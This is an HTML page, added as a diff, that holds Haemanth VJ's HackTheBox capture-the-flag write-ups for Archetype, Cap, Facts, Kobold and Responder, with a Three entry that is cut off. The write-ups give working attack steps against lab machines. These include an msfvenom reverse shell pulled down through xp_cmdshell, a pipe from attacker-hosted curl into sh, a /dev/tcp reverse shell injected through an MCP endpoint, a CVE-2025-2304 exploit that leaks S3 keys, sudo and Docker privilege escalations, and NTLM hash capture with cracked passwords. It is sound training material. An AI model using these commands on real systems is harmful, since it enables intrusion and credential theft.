@@ -1,0 +1,1349 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>HackTheBox — Machine Writeups · Haemanth VJ</title>
+<meta name="description" content="HackTheBox machine writeups by Haemanth VJ — Archetype, Cap, Facts, Kobold, Responder, Three, WingData." />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/marked/12.0.2/marked.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<style>
+  :root{
+    --bg:#070a08;--bg-2:#0b0f0c;--panel:#0e140f;--line:#1b271d;
+    --green:#9fef00;--green-dim:#6fa800;--text:#c7d1c9;--text-dim:#7e8a80;
+    --white:#eef3ee;--red:#ff3b3b;--amber:#ffbd2e;--blue:#6fd3ff;
+    --mono:'JetBrains Mono',ui-monospace,monospace;--display:'Chakra Petch',sans-serif;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  html{scroll-behavior:smooth}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);line-height:1.7;
+    overflow-x:hidden;-webkit-font-smoothing:antialiased}
+  body::before{content:"";position:fixed;inset:0;z-index:0;pointer-events:none;
+    background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);
+    background-size:46px 46px;opacity:.18;mask-image:radial-gradient(ellipse 80% 60% at 50% 0%,#000 30%,transparent 90%)}
+  body::after{content:"";position:fixed;inset:0;z-index:9999;pointer-events:none;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0 2px,rgba(0,0,0,.13) 2px 3px);mix-blend-mode:multiply;opacity:.45}
+  .glow{position:fixed;z-index:0;border-radius:50%;filter:blur(130px);pointer-events:none;
+    width:480px;height:480px;background:rgba(159,239,0,.06);top:-160px;right:-120px}
+  a{color:inherit;text-decoration:none}
+  ::selection{background:var(--green);color:#04140a}
+
+  /* NAV */
+  nav{position:sticky;top:0;z-index:50;backdrop-filter:blur(10px);
+    background:linear-gradient(180deg,rgba(7,10,8,.92),rgba(7,10,8,.55));border-bottom:1px solid var(--line)}
+  .nav-in{max-width:1180px;margin:0 auto;padding:14px 26px;display:flex;justify-content:space-between;align-items:center}
+  .brand{font-family:var(--display);font-weight:700;letter-spacing:1px;color:var(--white);font-size:15px}
+  .brand b{color:var(--green)}
+  .back{font-size:13px;color:var(--text-dim);transition:color .2s;display:flex;align-items:center;gap:8px}
+  .back:hover{color:var(--green)}
+
+  /* HERO */
+  .head{max-width:1180px;margin:0 auto;padding:64px 26px 24px;position:relative;z-index:2}
+  .eyebrow{display:inline-flex;align-items:center;gap:9px;font-size:12px;color:var(--text-dim);
+    border:1px solid var(--line);border-radius:40px;padding:6px 14px;margin-bottom:22px;letter-spacing:1.5px}
+  .dot{width:8px;height:8px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green)}
+  .head h1{font-family:var(--display);font-weight:700;color:var(--white);
+    font-size:clamp(2.2rem,6vw,4rem);line-height:1;letter-spacing:-1px;margin-bottom:14px}
+  .head h1 .g{color:var(--green)}
+  .head .sub{color:var(--text-dim);max-width:640px;font-size:15px}
+  .head .stats{display:flex;gap:26px;margin-top:26px;flex-wrap:wrap}
+  .stat{display:flex;flex-direction:column}
+  .stat .n{font-family:var(--display);font-size:26px;font-weight:700;color:var(--green)}
+  .stat .l{font-size:11px;color:var(--text-dim);letter-spacing:1.5px}
+
+  /* FILTER */
+  .filters{max-width:1180px;margin:0 auto;padding:8px 26px 0;position:relative;z-index:2;display:flex;gap:10px;flex-wrap:wrap}
+  .chip{font-size:12px;letter-spacing:1px;color:var(--text-dim);border:1px solid var(--line);
+    padding:8px 16px;border-radius:40px;cursor:pointer;transition:.2s;background:transparent}
+  .chip:hover{color:var(--text);border-color:var(--green-dim)}
+  .chip.active{background:var(--green);color:#04140a;border-color:var(--green);font-weight:700}
+
+  /* LAYOUT */
+  .layout{max-width:1180px;margin:0 auto;padding:24px 26px 100px;position:relative;z-index:2;
+    display:grid;grid-template-columns:250px 1fr;gap:48px;align-items:start}
+  @media(max-width:880px){.layout{grid-template-columns:1fr;gap:0}}
+  aside{position:sticky;top:84px}
+  @media(max-width:880px){aside{position:static;margin-bottom:36px}}
+  .toc-title{font-size:11px;letter-spacing:2px;color:var(--green-dim);margin-bottom:14px;padding-left:14px}
+  .toc{border-left:1px solid var(--line)}
+  .toc a{display:flex;align-items:center;gap:8px;padding:9px 14px;font-size:13px;color:var(--text-dim);
+    border-left:2px solid transparent;margin-left:-1px;transition:.2s}
+  .toc a:hover{color:var(--text)}
+  .toc a.active{color:var(--green);border-left-color:var(--green)}
+  .toc a.hidden{display:none}
+  .os-pill{font-size:9px;letter-spacing:1px;padding:2px 7px;border-radius:4px;border:1px solid currentColor;flex-shrink:0}
+  .os-win{color:var(--blue)} .os-lin{color:var(--amber)}
+
+  /* MARKDOWN BODY */
+  #doc{min-width:0}
+  #loading{color:var(--text-dim);font-size:14px;padding:40px 0}
+  .wu{border:1px solid var(--line);background:linear-gradient(180deg,var(--panel),var(--bg-2));
+    border-radius:10px;padding:34px 38px;margin-bottom:34px;scroll-margin-top:84px;position:relative;overflow:hidden}
+  .wu::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--green);opacity:.5}
+  .wu.hidden{display:none}
+  @media(max-width:560px){.wu{padding:26px 22px}}
+
+  #doc h1{font-family:var(--display);font-weight:700;color:var(--white);font-size:clamp(1.5rem,4vw,2rem);
+    letter-spacing:-.5px;line-height:1.1;margin-bottom:14px;display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+  #doc h2{font-family:var(--display);font-weight:600;color:var(--white);font-size:1.1rem;
+    margin:32px 0 14px;padding-bottom:8px;border-bottom:1px solid var(--line)}
+  #doc h3{font-family:var(--display);font-weight:600;color:var(--green);font-size:.95rem;margin:24px 0 12px;letter-spacing:.3px}
+  #doc h3::before{content:"$ ";color:var(--green-dim)}
+  #doc p{color:var(--text-dim);margin:0 0 14px;font-size:14.5px}
+  #doc strong{color:var(--text);font-weight:600}
+  #doc a{color:var(--green);border-bottom:1px dotted var(--green-dim)}
+  #doc a:hover{background:rgba(159,239,0,.08)}
+  #doc ul,#doc ol{color:var(--text-dim);margin:0 0 16px;padding-left:24px;font-size:14.5px}
+  #doc li{margin-bottom:6px} #doc li::marker{color:var(--green-dim)}
+  #doc hr{border:0;height:1px;background:var(--line);margin:24px 0}
+
+  /* metadata table */
+  #doc table{border-collapse:collapse;margin:0 0 20px;width:100%;max-width:620px;font-size:13px}
+  #doc th,#doc td{border:1px solid var(--line);padding:9px 14px;text-align:left;vertical-align:top}
+  #doc thead{display:none}
+  #doc td:first-child{color:var(--green-dim);width:130px;font-weight:500;background:rgba(159,239,0,.03)}
+  #doc td:last-child{color:var(--text)}
+
+  /* inline code & flags */
+  #doc :not(pre)>code{font-family:var(--mono);font-size:.85em;color:var(--green);
+    background:rgba(159,239,0,.08);border:1px solid rgba(159,239,0,.18);border-radius:5px;padding:2px 7px}
+  #doc pre{background:#05080699;border:1px solid var(--line);border-radius:8px;margin:0 0 18px;overflow-x:auto;position:relative}
+  #doc pre code{font-family:var(--mono);font-size:13px;line-height:1.6;display:block;padding:16px 18px;color:var(--text);
+    background:none;border:0;white-space:pre}
+  #doc pre::before{content:"";display:block;height:30px;border-bottom:1px solid var(--line);background:rgba(255,255,255,.012)}
+  #doc pre::after{content:"●  ●  ●";position:absolute;top:7px;left:14px;font-size:9px;color:var(--text-dim);letter-spacing:2px}
+
+  #doc blockquote{border-left:2px solid var(--green-dim);background:rgba(159,239,0,.04);
+    padding:12px 18px;margin:0 0 16px;border-radius:0 6px 6px 0}
+  #doc blockquote p{color:var(--text);margin:4px 0;font-size:13.5px}
+
+  /* hljs tokens */
+  .hljs-comment,.hljs-quote{color:#5a6b5e;font-style:italic}
+  .hljs-keyword,.hljs-selector-tag,.hljs-built_in,.hljs-name{color:#9fef00}
+  .hljs-string,.hljs-attr,.hljs-symbol{color:#d6ff7a}
+  .hljs-number,.hljs-literal{color:#ffbd2e}
+  .hljs-title,.hljs-section,.hljs-function .hljs-title{color:#6fd3ff}
+  .hljs-variable,.hljs-template-variable{color:#e0e6e0}
+  .hljs-meta,.hljs-meta .hljs-keyword{color:#7e8a80}
+  .hljs-type{color:#6fd3ff}.hljs-deletion{color:#ff3b3b}.hljs-addition{color:#9fef00}
+
+  footer{border-top:1px solid var(--line);padding:28px 0;position:relative;z-index:2}
+  .foot-in{max-width:1180px;margin:0 auto;padding:0 26px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;font-size:12px;color:var(--text-dim)}
+  .foot-in b{color:var(--green-dim)}
+  .empty{color:var(--text-dim);font-size:14px;padding:30px 0;display:none}
+</style>
+</head>
+<body>
+<div class="glow"></div>
+
+<nav>
+  <div class="nav-in">
+    <a class="brand" href="index.html">haemanth<b>.</b>vj</a>
+    <a class="back" href="index.html">← back to portfolio</a>
+  </div>
+</nav>
+
+<div class="head">
+  <div class="eyebrow"><span class="dot"></span> HACK THE BOX · MACHINE WRITEUPS</div>
+  <h1>Boxes, <span class="g">rooted.</span></h1>
+  <p class="sub">Step-by-step writeups of HackTheBox machines — recon to root. Each one walks the full kill chain: enumeration, foothold, and privilege escalation, with the reasoning behind every move.</p>
+  <div class="stats">
+    <div class="stat"><span class="n" id="stCount">—</span><span class="l">MACHINES</span></div>
+    <div class="stat"><span class="n" id="stLin">—</span><span class="l">LINUX</span></div>
+    <div class="stat"><span class="n" id="stWin">—</span><span class="l">WINDOWS</span></div>
+  </div>
+</div>
+
+<div class="filters" id="filters">
+  <button class="chip active" data-os="all">ALL</button>
+  <button class="chip" data-os="linux">LINUX</button>
+  <button class="chip" data-os="windows">WINDOWS</button>
+</div>
+
+<div class="layout">
+  <aside>
+    <div class="toc-title">// MACHINES</div>
+    <nav class="toc" id="toc"></nav>
+  </aside>
+  <main id="doc">
+    <div id="loading">> rendering writeups<span>_</span></div>
+    <div class="empty" id="empty">> no machines match that filter.</div>
+  </main>
+</div>
+
+<footer>
+  <div class="foot-in">
+    <div>© 2026 Haemanth VJ — <b>recon. exploit. escalate.</b></div>
+    <div><a href="https://github.com/Haemanthvj/HTB-Writeups" target="_blank" rel="noopener" style="color:var(--green-dim)">source on github ↗</a></div>
+  </div>
+</footer>
+
+<!-- HTB writeup source (markdown). Edit/append machines here, or enable LIVE mode in the script. -->
+<script id="md" type="text/plain">
+# HackTheBox — Archetype Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox (Starting Point) |
+| **Machine** | Archetype |
+| **OS** | Windows |
+| **Focus** | SMB null session, config-file credential leak, MSSQL `xp_cmdshell` RCE, Meterpreter, PowerShell history → admin |
+
+> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.
+
+---
+
+## 1. Reconnaissance
+
+Scan all ports with service detection and default scripts:
+
+```bash
+nmap -p- -sC -sV <target-ip>
+```
+
+Key services on this box:
+
+- `135`, `139`, `445/tcp` — RPC / NetBIOS / SMB
+- `1433/tcp` — Microsoft SQL Server
+
+With SMB and MSSQL exposed, start with SMB.
+
+---
+
+## 2. SMB Enumeration
+
+List shares with a **null (blank) session** — when prompted for a password, just press Enter:
+
+```bash
+smbclient -L //<target-ip>
+# Password: (leave blank)
+```
+
+A non-default share named **`backups`** stands out. Connect to it:
+
+```bash
+smbclient //<target-ip>/backups
+smb: \> ls
+```
+
+There's a config file in the share. Download it:
+
+```bash
+smb: \> get prod.dtsConfig
+```
+
+---
+
+## 3. Credential Leak in the Config File
+
+`prod.dtsConfig` is an SSIS configuration file containing a **SQL Server connection string** — including the service account username (`ARCHETYPE\sql_svc`) and its **plaintext password**.
+
+```bash
+cat prod.dtsConfig
+```
+
+Note the `User ID` and `Password` values from the connection string.
+
+---
+
+## 4. Authenticating to MSSQL
+
+Use Impacket's `mssqlclient.py` to log in. Review its options first:
+
+```bash
+python3 /path/to/impacket/examples/mssqlclient.py -h
+```
+
+Then connect, using `-windows-auth` so the service account authenticates as a Windows login:
+
+```bash
+mssqlclient.py ARCHETYPE/sql_svc:'<password>'@<target-ip> -windows-auth
+```
+
+---
+
+## 5. Command Execution via `xp_cmdshell`
+
+The `sql_svc` account has rights to enable the `xp_cmdshell` extended stored procedure, which runs OS commands from within SQL:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+
+That confirms code execution as `archetype\sql_svc`. The **user flag** is reachable from this account's reachable directories (e.g. the user's Desktop).
+
+---
+
+## 6. Upgrading to a Meterpreter Shell
+
+**Generate a reverse-shell payload** with `msfvenom`:
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+```
+
+> `msfvenom` is the Metasploit Framework's standalone payload generator/encoder.
+
+**Host the payload** over HTTP from the attacker box:
+
+```bash
+python3 -m http.server 80
+```
+
+**Start the listener** in Metasploit:
+
+```bash
+msfconsole
+msf6 > use exploit/multi/handler
+msf6 > set payload windows/x64/meterpreter/reverse_tcp
+msf6 > set LHOST tun0
+msf6 > set LPORT 4444
+msf6 > run
+```
+
+**Pull and run the payload** on the target via `xp_cmdshell` (download then execute):
+
+```sql
+EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://<attacker-ip>/shell.exe -OutFile C:\Windows\Temp\shell.exe"';
+EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';
+```
+
+The handler catches the connection and a Meterpreter session opens as `sql_svc`.
+
+---
+
+## 7. Privilege Escalation
+
+From the session, look for paths to Administrator. Two standard moves:
+
+**Automated suggester:**
+
+```
+meterpreter > run post/multi/recon/local_exploit_suggester
+```
+
+**PowerShell history (the intended route):**
+
+The `sql_svc` user's PowerShell console history often stores commands containing the Administrator password. Check:
+
+```
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+```
+
+This file reveals an admin credential used in a prior `net use` / SMB command.
+
+**Use the admin credential** to get a privileged shell, e.g. via Impacket's `psexec.py`:
+
+```bash
+psexec.py administrator@<target-ip>
+```
+
+That yields a shell as `NT AUTHORITY\SYSTEM`, and the **root/administrator flag** is then readable from the Administrator desktop.
+
+
+# HackTheBox — Cap Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox |
+| **Machine** | Cap |
+| **OS** | Linux |
+| **Focus** | IDOR on a pcap dashboard, credential recovery from network capture, Linux capabilities (`cap_setuid`) privilege escalation |
+
+> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP where shown.
+
+---
+
+## 1. Reconnaissance
+
+Connect to the HTB VPN and reach the target's web app — a **Security Dashboard**. The dashboard lets you generate and **download a PCAP** of captured traffic.
+
+After running a capture, you're redirected to a URL like:
+
+```
+http://<target-ip>/data/<id>
+```
+
+where `<id>` is a number that changes on each visit, and the corresponding download is `/download/<id>` (e.g. `<id>.pcap`).
+
+---
+
+## 2. IDOR — Grabbing the First Capture
+
+The capture ID is **predictable and not access-controlled** — a classic Insecure Direct Object Reference (IDOR). Instead of using the freshly generated (and usually empty) capture, manually request a lower index:
+
+```
+http://<target-ip>/data/0
+```
+
+Download `0.pcap` — the very first capture, which contains earlier session traffic.
+
+---
+
+## 3. Credential Recovery from the PCAP
+
+Open `0.pcap` in **Wireshark** (or run `strings` / follow TCP streams). The capture includes a cleartext authentication exchange — an **FTP login** sends the **username and password in plaintext**.
+
+Recover the credentials for the user **`nathan`** from that stream.
+
+---
+
+## 4. Foothold
+
+The recovered FTP credentials are reused for SSH. Log in:
+
+```bash
+ssh nathan@<target-ip>
+```
+
+The **user flag** is readable in `nathan`'s home directory:
+
+```bash
+ls
+cat user.txt
+```
+
+---
+
+## 5. Privilege Escalation — Linux Capabilities
+
+Enumerate file capabilities across the whole filesystem:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/.../gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+
+> `getcap -r / 2>/dev/null` is a "treasure hunt" for binaries granted special Linux capabilities. Capabilities are fine-grained slices of root power assigned to a binary, independent of SUID bits.
+
+The critical line:
+
+```
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+```
+
+**`cap_setuid`** on the Python binary means Python can change its own UID to anything — including `0` (root) — without being SUID-root. That's a direct path to a root shell.
+
+### Get root
+
+```bash
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+This sets the UID to `0` and spawns a shell as root. The **root flag** is then readable from `/root/`.
+
+---
+
+## Appendix — Enumeration with LinPEAS
+
+If the capability misconfiguration isn't obvious manually, **LinPEAS** automates the search for privilege-escalation paths.
+
+Serve the script from your attacker box:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+Then pull and run it on the target:
+
+```bash
+# on the target
+curl http://<attacker-ip>/linpeas.sh | sh
+# or: wget http://<attacker-ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
+```
+
+LinPEAS would flag the `cap_setuid` capability on `python3.8` among its findings.
+
+
+# HackTheBox — Facts Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox |
+| **Machine** | Facts |
+| **OS** | Linux |
+| **Domain** | `facts.htb` |
+| **Focus** | Web enum, Camaleon CMS privilege escalation (CVE-2025-2304), S3 credential leak, SSH key cracking, `facter` sudo abuse |
+
+> Educational write-up of a HackTheBox lab machine. Substitute your own target IP where shown.
+
+---
+
+## 1. Reconnaissance
+
+Run a full port scan with default scripts and version detection:
+
+```bash
+nmap -p- -sC -sV <target-ip>
+```
+
+Identify the open ports (SSH and a web service), then map the host:
+
+```bash
+sudo subl /etc/hosts        # add: <target-ip>  facts.htb
+```
+
+Browsing `http://facts.htb` shows a site with no obvious sign-up or login entry point, so move to content/vhost discovery.
+
+---
+
+## 2. Web Enumeration
+
+**Directory brute force:**
+
+```bash
+gobuster dir -u http://facts.htb \
+  -w /usr/share/wordlists/dirbuster/directory-medium.txt
+```
+
+```
+admin    (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
+```
+
+(Optionally, vhost enumeration with `gobuster vhost` can be run in parallel to check for subdomains.)
+
+The `/admin` redirect leads to a login portal at `http://facts.htb/admin/login`.
+
+---
+
+## 3. Identifying the CMS
+
+The admin portal allows **register** and **login**. After creating an account and logging in, opening the **profile** page and scrolling down reveals the software in use:
+
+- **Camaleon CMS**, **version 2.9.0**
+
+That version is affected by a known authenticated privilege-escalation flaw — **CVE-2025-2304**.
+
+---
+
+## 4. Exploitation — CVE-2025-2304 (Authenticated Privilege Escalation)
+
+Using the public PoC for CVE-2025-2304, run the exploit with the credentials of the account just registered:
+
+```bash
+python exploit.py -u http://facts.htb -U haems -P password -e -r
+```
+
+```
+[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
+[+] Login confirmed
+    User ID: 5
+    Current User Role: client
+[+] Loading PRIVILEGE ESCALATION
+    User ID: 5
+    Updated User Role: admin
+[+] Extracting S3 Credentials
+    s3 access key: AKIAF71E63668BE2BADE
+    s3 secret key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
+    s3 endpoint: http://localhost:54321
+[+] Reverting User Role
+    User ID: 5
+    User Role: client
+```
+
+The exploit temporarily elevates the account to **admin**, reads the application's stored **S3 credentials** (access key, secret key, and endpoint), then reverts the role to avoid leaving traces.
+
+Recovered S3 credentials:
+
+```
+Access Key: AKIAF71E63668BE2BADE
+Secret Key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
+Endpoint:   http://localhost:54321   (reachable as http://facts.htb:54321)
+```
+
+---
+
+## 5. Looting the S3 Bucket
+
+The endpoint is an S3-compatible object store (MinIO). Configure an AWS CLI profile with the leaked keys:
+
+```bash
+aws configure --profile facts
+# AWS Access Key ID:     AKIAF71E63668BE2BADE
+# AWS Secret Access Key: faPCaUz2hba2P2cv6b99BNSinJztIZdWmwmbcKln
+# Default region name:   us-east-1
+# Default output format: json
+```
+
+List the `internal` bucket, pointing at the custom endpoint:
+
+```bash
+aws s3 ls s3://internal/.ssh/ \
+  --endpoint-url http://facts.htb:54321 --profile facts
+```
+
+There's an SSH private key in `.ssh/`. Download it:
+
+```bash
+aws s3 cp s3://internal/.ssh/id_ed25519 facts.id \
+  --endpoint-url http://facts.htb:54321 --profile facts
+chmod 600 facts.id
+```
+
+---
+
+## 6. Cracking the SSH Key Passphrase
+
+The private key is passphrase-protected. Convert it to a John-compatible hash and crack it:
+
+```bash
+ssh2john facts.id > facts.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt facts.hash
+```
+
+The passphrase recovered:
+
+```
+dragonballz
+```
+
+---
+
+## 7. Foothold
+
+Log in over SSH using the cracked key (the key belongs to the `trivia` user):
+
+```bash
+ssh trivia@facts.htb -i facts.id
+# (passphrase: dragonballz)
+```
+
+The user flag lives under `william`'s home directory, which `trivia` can read:
+
+```bash
+trivia@facts:~$ cat /home/william/user.txt
+```
+
+---
+
+## 8. Privilege Escalation — `sudo facter`
+
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+`trivia` is allowed to run **`/usr/bin/facter`** as root. Facter (Puppet's system-inventory tool) supports **custom facts written in Ruby** loaded from a directory via `--custom-dir`. Because custom facts are arbitrary Ruby code executed by Facter, a malicious fact run as root yields a root shell.
+
+Write a custom fact that spawns a shell:
+
+```bash
+echo 'Facter.add(:exploit) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
+```
+
+Run Facter as root, pointing it at the custom directory and naming the fact:
+
+```bash
+sudo /usr/bin/facter --custom-dir /tmp exploit
+```
+
+```
+root@facts:/# id
+uid=0(root) ...
+```
+
+Root access achieved; the root flag can be read from `/root/root.txt`.
+
+
+# HackTheBox — Kobold Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox |
+| **Machine** | Kobold |
+| **OS** | Linux |
+| **Domain** | `kobold.htb` |
+| **Focus** | VHost enumeration, MCP server command injection, Docker group privilege escalation |
+
+> Educational write-up of a HackTheBox lab machine. Replace the attacker IP (`10.10.15.39`) and ports with your own values throughout.
+
+---
+
+## 1. Reconnaissance
+
+Begin with a port scan. The target exposes:
+
+- `22/tcp` — SSH
+- `80/tcp` — HTTP
+- `443/tcp` — HTTPS
+- `3552/tcp` — an additional HTTP service on a non-standard, "random" port
+
+Browsing to the service on port `3552` reveals an **Arcane**-themed web page — the primary application to attack.
+
+Add the domain to `/etc/hosts` so name-based virtual hosts resolve:
+
+```
+<target-ip>  kobold.htb
+```
+
+---
+
+## 2. Virtual Host Enumeration
+
+Since the site is served over HTTPS with a self-signed/untrusted certificate, fuzz for virtual hosts with Gobuster, ignoring TLS validation:
+
+```bash
+gobuster vhost -u "https://kobold.htb" \
+  -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt \
+  --append-domain --no-tls-validation
+```
+
+```
+mcp.kobold.htb   Status: 200 [Size: 466]
+bin.kobold.htb   Status: 200 [Size: 24402]
+```
+
+Two virtual hosts surface:
+
+- **`mcp.kobold.htb`** — an MCP (Model Context Protocol) server endpoint.
+- **`bin.kobold.htb`** — a PrivateBin instance.
+
+Add both to `/etc/hosts`.
+
+> **About `--no-tls-validation` (`-k`):** this flag tells the tool to ignore untrusted, expired, or self-signed certificate warnings and scan anyway. It's fine for saving time in a lab, but note that in a real-world external pentest or compliance audit, *checking* for broken/invalid TLS configuration is itself part of the engagement, so don't blindly suppress it there.
+>
+> **What a TLS/SSL certificate is:** a digital file on the web server providing two things — **encryption** of traffic and **authentication** of the server's identity.
+
+---
+
+## 3. Foothold — MCP Server Command Injection
+
+The `mcp.kobold.htb` host runs an **MCP server**. Researching MCP server vulnerabilities points to the `/api/mcp/connect` endpoint, which accepts a server configuration specifying a `command` and `args` to launch — with no sanitization. That is direct **command execution**.
+
+### Set up a listener
+
+On the attacker box:
+
+```bash
+nc -lvnp 4444
+```
+
+### Trigger the reverse shell
+
+Send a crafted MCP connect request whose `command`/`args` spawn a reverse shell back to the listener:
+
+```bash
+curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
+  -H "Content-Type: application/json" \
+  -d '{
+    "serverId": "shell1",
+    "serverConfig": {
+      "command": "bash",
+      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.39/4444 0>&1"],
+      "env": {}
+    }
+  }'
+```
+
+The listener catches a shell as the application user (`ben`).
+
+### User flag
+
+With shell access, grab the user flag:
+
+```bash
+cat user.txt
+```
+
+---
+
+## 4. Privilege Escalation — Docker Group
+
+Enumerate the system for escalation paths.
+
+```bash
+sudo -l
+# permission denied / no useful sudo rights
+```
+
+`sudo` is a dead end, so look elsewhere. Docker is running on the host:
+
+```bash
+docker ps
+# permission denied while trying to connect to the Docker daemon socket
+```
+
+The user `ben` *is listed* in the `docker` group, but the **current shell session** is still running under its primary group (`gid=1001(ben)`). The reverse shell never picked up the supplementary `docker` group, so the kernel blocks access to the Docker control socket (`/var/run/docker.sock`).
+
+### Refresh the group membership
+
+```bash
+newgrp docker
+```
+
+`newgrp docker` starts a new shell instance in the same terminal and switches the **active** group ID to `docker`. Now the session's token actually belongs to the `docker` group, the socket permissions match, and Docker commands work:
+
+```bash
+docker ps
+```
+
+### Escape the docker group to root
+
+Membership in the `docker` group is effectively root-equivalent: you can launch a container running as root and mount the host's entire filesystem into it. The PrivateBin image is already present on the box, so no pull is needed.
+
+Set up a second listener:
+
+```bash
+nc -lvnp 5555
+```
+
+Then, from the `newgrp docker` shell, run a privileged container as root (`-u 0`) that mounts the host root (`/`) into `/mnt` and uses that access to execute as root on the host — for example, dropping a root reverse shell or reading protected files directly:
+
+```bash
+docker run --rm -u 0 --entrypoint sh \
+  -v /:/mnt \
+  privatebin/nginx-fpm-alpine:2.0.2 \
+  -c "<root payload operating on /mnt>"
+```
+
+Because `/mnt` is the real host filesystem, anything done as root inside the container (writing a SUID binary, adding an SSH key, editing `/mnt/etc/...`, or firing a reverse shell back to port `5555`) executes with full host-root authority.
+
+### Root flag
+
+The second listener receives a root shell, granting access to the root flag:
+
+```bash
+cat /root/root.txt
+```
+
+
+# HackTheBox — Responder Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox (Starting Point) |
+| **Machine** | Responder |
+| **OS** | Windows |
+| **Focus** | LFI / remote file inclusion, NTLMv2 hash capture with Responder, hash cracking, WinRM access |
+
+> Educational write-up of a retired HackTheBox lab machine. Substitute your own target IP and tun0 address where shown.
+
+---
+
+## 1. Reconnaissance
+
+Enumerate the web server and map the host. A quick vuln scan is useful for orientation:
+
+```bash
+nikto -host http://<target-ip>
+```
+
+> **Nikto** is an open-source web server scanner that checks for thousands of dangerous files, outdated software, and misconfigurations.
+
+The site has a page parameter of the form:
+
+```
+/index.php?page=index.html
+```
+
+A `page` parameter that loads files is a classic **file inclusion** indicator.
+
+---
+
+## 2. Confirming File Inclusion
+
+The `page` parameter includes files without sanitization. Beyond local files, it will also resolve a **UNC path to a remote SMB share** — which is the key behavior here. Pointing it at your own machine forces the target to authenticate to you over SMB:
+
+```
+/index.php?page=//<attacker-ip>/somefile
+```
+
+---
+
+## 3. Capturing the NTLMv2 Hash with Responder
+
+Start **Responder** on the VPN interface so it answers the incoming SMB authentication and captures the credentials:
+
+```bash
+sudo responder -I tun0
+```
+
+> **Responder** poisons LLMNR/NBT-NS/MDNS and runs rogue SMB/HTTP servers to capture authentication. Here it simply catches the SMB auth the target sends when it tries to fetch the remote file.
+
+Now trigger the inclusion by visiting:
+
+```
+http://<target-ip>/index.php?page=//<attacker-ip>/somefile
+```
+
+Responder logs the target's NTLMv2 challenge/response:
+
+```
+[SMB] NTLMv2-SSP Client   : <target-ip>
+[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
+[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:<server-challenge>:<response>:<blob...>
+```
+
+Save the full hash line to a file:
+
+```bash
+echo 'Administrator::RESPONDER:<server-challenge>:<response>:<blob...>' > hash.txt
+```
+
+---
+
+## 4. Cracking the Hash
+
+Crack the NetNTLMv2 hash with John against `rockyou`:
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+```
+badminton        (Administrator)
+1g 0:00:00:00 DONE ...
+```
+
+The Administrator password is recovered: `badminton`.
+
+(To re-display cracked results: `john --show --format=netntlmv2 hash.txt`.)
+
+---
+
+## 5. Foothold via WinRM
+
+Windows Remote Management listens on TCP **5985**. With valid credentials, connect using **evil-winrm**:
+
+```bash
+evil-winrm -i <target-ip> -u Administrator -p badminton
+```
+
+> **WinRM** allows remote management of Windows hosts; **evil-winrm** is the go-to tool for getting an interactive shell once you hold valid credentials.
+
+From the shell, the flag lives under the relevant user's directory (e.g. `C:\Users\mike\Desktop\`):
+
+```powershell
+type C:\Users\mike\Desktop\flag.txt
+```
+
+
+# HackTheBox — Three Write-up
+
+| | |
+|---|---|
+| **Platform** | HackTheBox (Starting Point) |
+| **Machine** | Three |
+| **OS** | Linux |
+| **Domain** | `thetoppers.htb` |
